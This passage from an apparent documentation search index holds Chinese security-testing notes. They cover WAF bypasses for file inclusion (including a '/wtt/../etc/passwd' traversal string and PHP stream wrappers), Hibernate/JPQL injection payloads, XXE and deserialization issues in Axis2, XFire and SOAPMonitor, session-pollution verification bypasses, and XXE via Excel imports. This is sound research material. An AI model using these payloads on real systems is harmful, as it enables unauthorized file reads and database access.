\u5bf9\u4e8e\u7edd\u5bf9\u8def\u5f84\u6587\u4ef6\u5305\u542b\uff0cWAF\u4e00\u822c\u4f1a\u62e6\u622a\u5e38\u89c1\u8def\u5f84\uff0c\u800c\u4e0d\u4f1a\u9632\u5fa1\u6240\u6709\u7684\u7edd\u5bf9\u8def\u5f84\u3002\u56e0\u6b64\uff0c\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u53ef\u4ee5\u5305\u542b\u5176\u4ed6\u7684\u8def\u5f84\u4e0b\u4e00\u4e9b\u6587\u4ef6\uff0c\u4f8b\u5982/usr/local/nginx/conf/nginx.conf\u3002 \u5982\u679cWAF\u53ea\u68c0\u6d4b\u8fde\u7eed\u7684../\uff0c\u68c0\u67e5\u5f00\u59cb\u8def\u5f84\u4e3aLinux\u7684\u76ee\u5f55\u540d\uff0c\u53ef\u4ee5\u91c7\u7528/wtt/../\u7ed5\u8fc7WAF\u6587\u4ef6\u5305\u542b\u68c0\u6d4b\u3002 \u4f8b\u5982\uff0c\u201c/wtt/../etc/passwd\u201d\uff0c wtt\u4e0d\u662fLinux\u6807\u51c6\u76ee\u5f55\uff0c\u4e0d\u4f1a\u88ab\u89c4\u5219\u5339\u914d\u3002WAF\u53ea\u68c0\u6d4b\u8fde\u7eed\u7684../\uff0c\u4f46\u662f\u53ea\u4f7f\u7528\u4e00\u4e2a../\uff0c\u4e0d\u88ab\u62e6\u622a\u3002\u6700\u7ec8\u8bfb\u53d6/etc/passwd\u6587\u4ef6\u3002 \u5229\u7528WAF\u672a\u68c0\u6d4b\u7684\u534f\u8bae\u3002PHP \u6587\u4ef6\u5305\u542b\u652f\u6301\u7684\u534f\u8bae\uff0c\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u770b\u73af\u5883\u9009\u62e9\u53ef\u884c\u7684\u65b9\u6cd5 file:// \u2014 Accessing local filesystem http:// \u2014 Accessing HTTP(s) URLs ftp:// \u2014 Accessing FTP(s) URLs php:// \u2014 Accessing various I/O streams zlib:// \u2014 Compression Streams data:// \u2014 Data (RFC 2397) glob:// \u2014 Find pathnames matching pattern phar:// \u2014 PHP Archive ssh2:// \u2014 Secure Shell 2 rar:// \u2014 RAR ogg:// \u2014 Audio streams expect:// \u2014 Process Interaction Streams \u603b\u7ed3 \u4e00\u4e2a\u597dWAF\u4e0d\u662f\u5439\u51fa\u6765\u7684\uff0c\u662f\u5b9e\u8df5\u68c0\u9a8c\u51fa\u6765\u7684\u3002\u7814\u7a76WAF\u7684\u7ed5\u8fc7\u624b\u6bb5\uff0c\u662f\u4e3a\u4e86\u66f4\u597d\u7684\u63d0\u5347WAF\u7684\u9632\u5fa1\u80fd\u529b\u3002\u5728\u7814\u7a76\u7a81\u7834\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u8981\u4ec5\u4ec5\u505c\u7559\u5728\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u57fa\u672c\u6f0f\u6d1e\u539f\u7406\uff0c\u9700\u8981\u5bf9\u6d89\u53ca\u5e76\u6df1\u5165\u66f4\u591a\u7684\u9886\u57df\uff0c\u4f8b\u5982HTTP\u534f\u8bae\u7406\u89e3\u548cPHP\u3001Tomcat\u5bf9HTTP\u534f\u8bae\u6e90\u7801\u5206\u6790\uff0cMySQL\u8bcd\u6cd5\u5206\u6790\uff0c\u548cFuzz\u7684\u601d\u8def\u7b49\u3002\u5728\u6b64\u8fc7\u7a0b\u4e2d\uff0c\u4f1a\u6709\u8bb8\u591a\u4e50\u8da3\uff0c\u4e5f\u4f1a\u6709\u5404\u65b9\u9762\u80fd\u529b\u7684\u63d0\u5347\u3002","title":"4.2.\u6587\u4ef6\u5305\u542b"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#3","text":"","title":"3.\u6846\u67b6\u5c42\u7684\u8bed\u53e5\u5206\u6790"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#jpql","text":"jpql\u4e0eSQL\u7684\u533a\u522b\u5c31\u662fSQL\u662f\u9762\u5411\u5bf9\u8c61\u5173\u7cfb\u6570\u636e\u5e93\uff0c\u4ed6\u64cd\u4f5c\u7684\u662f\u6570\u636e\u8868\u548c\u6570\u636e\u5217\uff0c\u800cjpql\u64cd\u4f5c\u7684\u5bf9\u8c61\u662f\u5b9e\u4f53\u5bf9\u8c61\u548c\u5b9e\u4f53\u5c5e\u6027 ORM\u6ce8\u5165 \u6570\u5b57\u7c7b\u578b\uff08 JPQL \uff09\uff1a SELECT e FROM user e WHERE e.id = SQL('(select 1 from dual where 1=1)\u2019) and SQL('(SELECT 1)=1\u2019) \u5b57\u7b26\u7c7b\u578b\uff08JPQL\uff09\uff1a \u901a\u5e38\u6307\u7684\u662f\u7c7b\u4f3chibernate\u4e00\u7c7b\u5177\u6709\u5b89\u5168\u8bed\u6cd5\u68c0\u6d4b\u7684\u6ce8\u5165","title":"\u57fa\u4e8ejpql\u7c7b\u578b\u7684\u7ed5\u8fc7\u5206\u6790"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#hibernate","text":"ORM\u6ce8\u5165 \u6570\u5b57\u7c7b\u578b\uff08 Hibernate ORM \uff09\uff1a test\\'' or 1<length((select version())) \u2013 \u7ffb\u8bd1\u6210\u4e3aHQL\u8bed\u53e5\u5c31\u53d8\u4e3a\uff1a SELECT p FROM pl.btbw.persistent.Post p where p.name='test\\'' or 1<length((select version())) \u2013 ' \u6700\u540e\u8f6c\u53d8\u4e3a\u771f\u6b63\u7684SQL\u8bed\u53e5\uff1a select post0_.id as id1_0_, post0_.name as name2_0_ from post post0_ where post0_.name=\u2018test\\'' or 1<length((select version())) -- ' \u8fd9\u6837\u6211\u4eec\u5c31\u4f1a\u9003\u9038\u51fa\u6765\u4e00\u4e2a\u8bed\u53e5\u6216\u8005\u65b9\u6cd5 \u901a\u5e38\u6307\u7684\u662f\u7c7b\u4f3chibernate\u4e00\u7c7b\u5177\u6709\u5b89\u5168\u8bed\u6cd5\u68c0\u6d4b\u7684\u6ce8\u5165","title":"\u57fa\u4e8eHibernate\u7c7b\u578b\u7684\u7ed5\u8fc7\u5206\u6790"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#_4","text":"","title":"\u4e8c\u3001\u57fa\u4e8e\u4e09\u65b9\u8c03\u7528\u6846\u67b6\u5206\u6790\u5229\u7528"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#webservice","text":"1.\u9ed8\u8ba4\u7684\u5b89\u5168\u914d\u7f6e2.\u672a\u6388\u6743\u7684\u8bbf\u95ee3.\u81ea\u8eab\u672a\u4fee\u590d\u6f0f\u6d1eWEBSERVICE Jws\u6587\u4ef6\u5ba1\u8ba1 \u200b \u901a\u5e38\u800c\u8a00jws\u6587\u4ef6\u4e5f\u662faxis2\u53d1\u5e03\u7684\u4e00\u79cd\u8868\u73b0\u5f62\u5f0f\uff0c\u7136\u540e\u66f4\u591a\u7684\u88ab \u5ba1\u8ba1\u4eba\u5458\u5ffd\u7565 \u5728web\u76ee\u5f55\u5168\u5c40\u67e5\u627ejws\u7ed3\u5c3e\u7684\u6587\u4ef6 \u6839\u636e\u5bf9\u5e94\u7684web\u8bbf\u95ee\u76ee\u5f55\u901a\u8fc7\u6d4f\u89c8\u5668\u8fdb\u884c\u8bbf\u95ee \u5bf9\u5176\u76f8\u5e94\u7684\u63a5\u53e3\u8fdb\u884c\u5ba1\u8ba1 SOAPMonitor \u7528\u6765\u8fdb\u884cwebservice\u7ba1\u7406\u53d1\u5e03\uff0c\u8c03\u8bd5\u7b49\u7b49\uff0c\u8fd9\u91cc\u9762\u5b58\u5728\u4e00\u4e2a\u53cd\u5e8f \u5217\u5316\u7684\u95ee\u9898 \u8bbf\u95ee\u6839\u8def\u5f84/SOAPMonitor , \u53f3\u952e\u6e90\u7801\u5c31\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a\u914d\u7f6e\u9879 \u5185\u5bb9 \u8fdc\u7a0b\u8c03\u8bd5\u65f6\u5019\u5f00\u653e\u9ed8\u8ba45001\u7aef\u53e3\u8fdb\u884c\u5bf9\u8c61\u4f20\u8f93 \u5bfb\u627e\u5bf9\u5e94\u7684\u6267\u884c\u94fe\u6784\u9020payload\u8fdb\u884crec Axis2 \u5bf9\u4e8e\u6574\u4e2a\u9879\u76ee\u901a\u8fc7axis2\u6216\u8005axis\u53d1\u5e03\u7684\u670d\u52a1\uff0c\u4ece\u7edf\u8ba1\u7ecf\u9a8c\u4e0a\u6765\u8bb2\uff0c \u672a\u6388\u6743\u5927\u9762\u79ef\u5b58\u5728\uff0c\u800c\u4e14\u4f4e\u7248\u672c\u7684\u4ece\u5168\u5c40\u4e0a\u5c31\u5b58\u5728xml\u5b9e\u4f53\u6ce8\u5165 \u6f0f\u6d1e \u8bbf\u95ee\u5bf9\u5e94\u7684webservice\u8def\u5f84\uff0c\u6bd4\u5982/services/\u6216\u8005 /servlet/AxisServlet \u5bf9\u6240\u6709\u63a5\u53e3\u5bf9\u5e94\u7684\u7c7b\u8fdb\u884c\u5ba1\u8ba1\uff0c\u901a\u5e38\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u90fd\u662f\u4e00\u4e00\u5bf9\u5e94 \u4f4e\u7248\u672c\u6784\u9020xxe payload\u53ef\u4ee5\u8fdb\u884c\u6f0f\u6d1e\u6d4b\u8bd5 Xfire Web\u53d1\u5e03\u5bb9\u5668\uff0c\u5df2\u7ecf\u505c\u6b62\u7ef4\u62a4\uff0c\u622a\u81f3\u5230\u6700\u540e\u4e00\u4e2a\u7248\u672c\uff0c\u5728 webservice\u4e0a\u8fd8\u662f\u5b58\u5728xml\u5b9e\u4f53\u6ce8\u5165 \u8bbf\u95ee\u6839\u8def\u5f84/services\uff0c\u66b4\u9732\u5bf9\u5e94\u7684webservices\u63a5\u53e3 \u6784\u9020payload\u5168\u5c40\u9020\u6210xml\u5b9e\u4f53\u6ce8\u5165","title":"WEBSERVICE\u63a5\u53e3"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#dwr","text":"\u5b9e\u9645\u7684\u7f51\u7ad9\u53d1\u5e03debug\u6a21\u5f0f\u662f\u5173\u95ed\u72b6\u6001\uff0c\u6211\u4eec\u505a\u9ed1\u76d2\u6d4b\u8bd5\u5c31\u8981\u53bb\u731c\u6d4b \u4e24\u4e2a\u9ed8\u8ba4\u76ee\u5f55,\u5206\u522b\u4e3a/exec/\u548c/dwr \u5ba1\u8ba1\u53ef\u4ee5\u5957\u7528\u5de6\u8fb9\u7684\u8bf7\u6c42\u5305\u7684\u6a21\u677f\uff0c\u5728\u4f60\u8ba4\u4e3a\u5b58\u5728\u95ee\u9898\u7684\u5730\u65b9\u6784\u9020 java\u63a5\u53e3\u8c03\u7528\u7684\u8bf7\u6c42\u6570\u636e\u5305 \u7f51\u7ad9\u53d1\u5e03dwr\u63a5\u53e3\uff0c\u901a\u5e38\u90fd\u662f\u672a\u6388\u6743\u8c03\u7528\uff0c\u5305\u542b\u5185\u5bb9\u6bd4\u8f83\u591a\uff0c\u6bd4\u5982\u7528 \u6237\uff0c\u7ba1\u7406\u7b49api\u63a5\u53e3 \u5982\u679c\u53c2\u6570\u6784\u9020\u6709\u4e0d\u786e\u5b9a\u56e0\u7d20\uff0c\u53ef\u4ee5\u628a\u5bf9\u5e94\u7684dwr\u63a5\u53e3\u7a7a\u5b9e\u73b0\uff0c\u7136\u540e\u8f6c \u63a5\u5230\u6211\u4eec\u81ea\u5df1\u53ef\u4ee5\u672c\u5730\u6a21\u62df\u7684\u4ee3\u7801\u4e0a\u9762\u6765","title":"DWR\u63a5\u53e3"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#hessian","text":"","title":"HESSIAN\u63a5\u53e3"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#gwt","text":"","title":"GWT\u63a5\u53e3"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#sessionexc","text":"","title":"\u4e09\u3001\u8da3\u5473\u7684SESSION\u548cEXC"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#session","text":"\u573a\u666f\uff1a\u5728\u8fdb\u884c\u4e00\u4e9b\u64cd\u4f5c\u65f6,\u5f88\u5e38\u89c1\u7684\u5199\u6cd5\u662f\u5148\u5c06\u9a8c\u8bc1\u7801\u5b58\u50a8\u4e8eSession\u5f53\u4e2d\uff0c\u5c06\u9a8c\u8bc1\u7801\u4f5c\u4e3a\u56fe\u7247\u6216\u662f\u624b\u673a\u9a8c\u8bc1\u7801,\u90ae\u7bb1\u7b49\u65b9\u5f0f\u53d1\u9001\u7ed9\u7528\u6237,\u5bf9\u5176\u8fdb\u884c\u8eab\u4efd\u7684\u9a8c\u8bc1. \u901a\u5e38\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u4f1a\u5f88\u5bb9\u6613\u5f15\u53d1\u4e00\u4e2a\u95ee\u9898, \u8be5\u573a\u666f\u5e38\u89c1\u4e8ephp\u4e2d:\u7528\u6237A\u627e\u56de\u5bc6\u7801,\u9700\u8981\u8fdb\u884c\u624b\u673a\u6821\u9a8c\u7801\u7684\u6821\u9a8c,\u670d\u52a1\u5668\u628a\u53d1\u9001\u51fa\u53bb\u7684\u9a8c\u8bc1\u7801\u653e\u5728\u4e86Session\u4e2d,\u6b64\u65f6\u7528\u6237\u5fc5\u987b\u8f93\u5165\u6b63\u786e\u7684\u9a8c\u8bc1\u7801\u624d\u80fd\u6210\u529f\u7684\u8fdb\u884c\u5bc6\u7801\u91cd\u7f6e \u573a\u666f: \u5728php\u4e2d,session\u4f7f\u7528\u6587\u4ef6\u7684\u65b9\u5f0f\u5b58\u50a8,\u5b83\u7684\u552f\u4e00\u6027\u4e0d\u662f\u5f88\u597d(\u591a\u4e2a\u5e94\u7528\u53ef\u4ee5\u8bbf\u95ee\u540c\u4e00\u4e2aSession) \u67d0\u7a0b\u5e8f\u5458\u5f00\u53d1\u4e86\u4e00\u5957CMS\uff0c\u628a\u4ed6\u4f5c\u4e3a\u4e00\u4e2ademo\u90e8\u7f72\u5728\u4e86\u81ea\u5df1\u7684\u5b98\u7f51A\u4e0a\u67d0\u7a0b\u5e8f\u5458\u5f00\u53d1\u4e86\u4e00\u5957CMS\uff0c\u628a\u4ed6\u4f5c\u4e3a\u4e00\u4e2ademo\u90e8\u7f72\u5728\u4e86\u81ea\u5df1\u7684\u5b98\u7f51B \uff0c\u4f46\u662f\u8fd9\u4e24\u4e2a\u57df\u540d\u90fd\u89e3\u6790\u5230\u4e86\u540c\u4e00\u670d\u52a1\u5668\u4e0a,\u53ef\u80fd\u5c31\u4f1a\u4ea7\u751f\u5f88\u5927\u7684\u95ee\u9898 \u4f46\u662f\u5982\u679c\u5728\u6ca1\u53d1\u9001\u9a8c\u8bc1\u7801\u7684\u60c5\u51b5\u4e0b\uff0c\u90a3\u4e48session\u4e2dcode\u4e3a\u7a7a,\u518d\u5c06\u8bf7\u6c42\u63d0\u4ea4\u7684\u9a8c\u8bc1\u7801\u7f6e\u4e3a\u7a7a\uff0c\u4f7f\u7528php\u7684\u60c5\u51b5\u4e0b\u4f1a\u5bfc\u81f4false == false\uff0c\u5373\u6761\u4ef6\u4e3a\u771f\uff0c\u9a8c\u8bc1\u7801\u5339\u914d\u6210\u529f\uff0c \u51fa\u73b0\u8fd9\u4e00\u95ee\u9898\u7684\u539f\u56e0\u662f\u7531\u4e8e\u670d\u52a1\u5668\u6ca1\u6709\u6b63\u786e\u7684\u5904\u7406session\uff0c\u5728\u4f7f\u7528\u4e4b\u540e\u5fc5\u987b\u5bf9\u5176\u8fdb\u884c\u9500\u6bc1,\u5e76\u4e14\u9700\u8981\u5bf9session\u8fdb\u884c\u7a7a\u9a8c\u8bc1 \u5728\u672a\u767b\u5f55http://admin.test.com\u7684\u60c5\u51b5\u4e0b,\u901a\u8fc7\u5148\u8bbf\u95eehttp:// www.test.com/ demo\u7ad9\u70b9\u5bf9\u81ea\u5df1\u7684session\u8fdb\u884c\u4e00\u6b21\u8d4b\u503c,\u4f2a\u9020\u51fa\u8eab\u4efd \u90a3\u4e48\u8fd9\u4e2asession\u662f\u53ef\u4ee5\u88abhttp://admin.test.com\u8bbf\u95ee\u5230\u7684,\u6240\u4ee5\u9020\u6210\u7684\u6df7\u6dc6\u4f7f\u7528 \u5f15\u53d1\u5b89\u5168\u95ee\u9898","title":"SESSION\u6c61\u67d3"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#xxeexcel","text":"\u5e94\u7528\u573a\u666f\uff1a \u5728\u5f88\u591a\u7cfb\u7edf\uff0c\u4e0d\u7ba1\u662f\u540e\u53f0\u8fd8\u662f\u524d\u53f0\uff0c\u6211\u4eec\u7ecf\u5e38\u4f1a\u78b0\u5230\uff0c\u5bfc\u5165/\u5bfc \u51fa\u8fd9\u6837\u7684\u5b57\u6837\uff0c\u4ece\u7edf\u8ba1\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u767e\u5206\u4e4b\u516b\u5341\u4ee5\u4e0a\u90fd\u662fexcel\uff0c \u4f8b\u5982\uff0c\u5bfc\u5165\u4eba\u5458\u4fe1\u606f/\u5bfc\u51fa\u4eba\u5458\u4fe1\u606f\uff0c\u5f55\u5165\u7cfb\u7edf\u914d\u7f6e/\u5bfc\u51fa\u7cfb\u7edf\u914d \u7f6e\u7b49\u7b49 \u6280\u5de7\u53d8\u5f62\uff1a \u4ece\u67d0\u79cd\u610f\u4e49\u4e0a\uff0c\u6211\u4eec\u662f\u4e0d\u9700\u8981\u53bb\u4fee\u6539workbook.xml\uff0c\u6709\u65f6\u5019\u6211 \u4eec\u60f3\u8981\u8fbe\u5230\u7684\u76ee\u7684\u5c31\u662f\uff0c\u5bfc\u51fa\u6765\u4e4b\u540e\uff0c\u7136\u540e\u6839\u636e\u683c\u5f0f\uff0c\u5916\u90e8\u5b9e\u4f53 \u5f15\u5165\uff0c\u8bfb\u53d6\u7cfb\u7edf\u6587\u4ef6\uff0c\u6bd4\u5982/etc/passwd\u7b49\uff0c\u53ef\u4ee5\u5728\u5bfc\u5165\u7684\u65f6\u5019 \u8fdb\u884c\u64cd\u4f5c\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u5e94\u8be5\u53bb\u4fee\u6539xl/worksheets/sheet1.xml \u8c03\u7528\u7684\u5b9e\u4f53 \u66ff\u6362\u6a21\u677f\u6570\u636e\u5373\u53ef\uff0c\u8fd9\u65f6\u5019\u5f53\u6211\u4eec\u5bfc\u5165\u65f6\u5019\uff0c\u5c31\u4f1a\u628a \u7cfb\u7edf\u654f\u611f\u6587\u4ef6\u8bfb\u53d6\u51fa\u6765","title":"XXE\u5728EXCEL\u4e2d\u7684\u5e94\u7528\u573a\u666f"}]}